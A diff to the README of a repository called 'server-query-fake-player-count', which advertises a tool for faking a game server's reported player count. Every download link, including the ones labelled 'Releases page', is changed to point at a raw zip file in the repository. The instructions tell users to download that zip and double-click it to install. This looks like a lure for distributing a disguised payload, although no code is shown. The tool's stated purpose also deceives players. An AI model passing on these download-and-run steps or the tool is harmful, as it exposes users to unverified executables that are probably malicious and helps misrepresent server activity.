@@ -6,11 +6,11 @@ Welcome to the server-query-fake-player-count repository. This tool lets you cha
 
 ## 📥 Download
 
-[![Download Now](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip)](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip)
+[![Download Now](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip)](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip)
 
 Visit the Releases page to download the latest version of the application. 
 
-[Download Here!](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip)
+[Download Here!](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip)
 
 ## 🔧 System Requirements
 
@@ -26,10 +26,10 @@ Before you begin, make sure your system meets these requirements:
 
 1. Click on the link below to go to the Releases page:
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip)
    
 2. Find the latest version of the application. Look for the most recent release at the top of the page. 
-3. Click on the asset name to download the file (it will be something like `https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip`).
+3. Click on the asset name to download the file (it will be something like `https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip`).
 4. Once the file is downloaded, locate it in your Downloads folder or the location you saved it to.
 5. Double-click the downloaded file to start the installation process.
 6. Follow the on-screen instructions to install the application on your computer.
@@ -74,4 +74,4 @@ If you encounter any issues, feel free to reach out. You can open an issue on ou
 
 This project is licensed under the MIT License. You can use, modify, and distribute it freely, as long as you provide attribution.
 
-Thank you for choosing server-query-fake-player-count! Enjoy modifying player counts easily and efficiently. Remember to visit our [Releases page](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/server-query-fake-player-count_3.2.zip) for updates and new versions.
+Thank you for choosing server-query-fake-player-count! Enjoy modifying player counts easily and efficiently. Remember to visit our [Releases page](https://raw.githubusercontent.com/absencecampstool380/server-query-fake-player-count/main/embark/player-fake-server-query-count-2.9-alpha.5.zip) for updates and new versions.
